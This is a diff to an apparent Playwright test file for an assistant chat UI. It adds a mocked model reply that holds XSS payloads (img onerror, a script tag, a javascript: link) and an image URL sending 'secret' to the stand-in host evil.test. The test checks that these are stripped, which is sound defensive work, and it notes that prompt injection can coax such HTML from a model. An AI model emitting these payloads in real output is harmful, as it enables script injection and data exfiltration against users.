@@ -17,6 +17,20 @@ const lds: Record<string, LdsData> = {
     swbs: "6286FCA00000",
   },
 };
+/** Rich Markdown mixed with the HTML an injected prompt might coax out of a model. */
+const hostileReply = [
+  "### Steps",
+  "",
+  "1. **Inspect** the `coupling` face",
+  "2. Measure insert wear",
+  "",
+  "| Part | Limit |",
+  "| --- | --- |",
+  "| Insert | 0.5 mm |",
+  "",
+  '<img src="x" onerror="window.__pwned = 1"><script>window.__pwned = 2</script>',
+  "![pixel](https://evil.test/p.png?d=secret) [bad](javascript:window.__pwned=3) [spec](https://example.test)",
+].join("\n");
 test.beforeEach(async ({ page }) => {
   const data = structuredClone(fixture);
   let user = data.users.find((u) => u.id === "engineer")!;
@@ -39,6 +53,8 @@ test.beforeEach(async ({ page }) => {
           .filter((r) => r.status === "ESR Closed")
           .map((r) => ({ ...r, similarity: 80 })),
       };
+    else if (path === "/api/assistant/chat")
+      result = { reply: hostileReply, model: "fixture-model", mock: false };
     else if (path.endsWith("/draft")) {
       const record = data.records.find((r) => r.id === path.split("/")[3]);
       Object.assign(record!, body);
@@ -256,4 +272,37 @@ test("header fits a narrow container inside a desktop host", async ({
     "aria-busy",
     "false",
   );
+});
+
+test("assistant chat renders Markdown and strips unsafe HTML in a real browser", async ({
+  page,
+}) => {
+  await page.goto("/");
+  await page
+    .getByRole("button", { name: "Open 260037A" })
+    .click();
+  await page.getByRole("tab", { name: "Resolution", exact: true }).click();
+  await page.getByLabel("Message").fill("What should I inspect?");
+  await page.getByRole("button", { name: "Send", exact: true }).click();
+  const bubble = page.locator(".chat-message.assistant .chat-bubble");
+  await expect(bubble.locator("h3")).toHaveText("Steps");
+  await expect(bubble.locator("ol > li")).toHaveCount(2);
+  await expect(bubble.locator("strong")).toHaveText("Inspect");
+  await expect(bubble.locator("table td").first()).toHaveText("Insert");
+  await expect(
+    bubble.locator('a[href="https://example.test"]'),
+  ).toHaveAttribute("rel", "noopener noreferrer");
+  const html = await bubble.innerHTML();
+  expect(html).not.toMatch(/<img|<script|onerror|javascript:|evil\.test/);
+  expect(
+    await page.evaluate(() => (window as { __pwned?: number }).__pwned),
+  ).toBeUndefined();
+  await page.getByRole("button", { name: "Add to rationale" }).click();
+  // The rationale is rich text: lists and emphasis survive, headings become bold, tables become lines.
+  const rationale = page.getByLabel("Engineering rationale", { exact: true });
+  await expect(rationale.locator("ol > li")).toHaveCount(2);
+  await expect(rationale.locator("strong").first()).toHaveText("Steps");
+  await expect(rationale).toContainText("Insert | 0.5 mm");
+  const inserted = await rationale.innerHTML();
+  expect(inserted).not.toMatch(/<h3|<table|<code|<img|<script|<a /);
 });
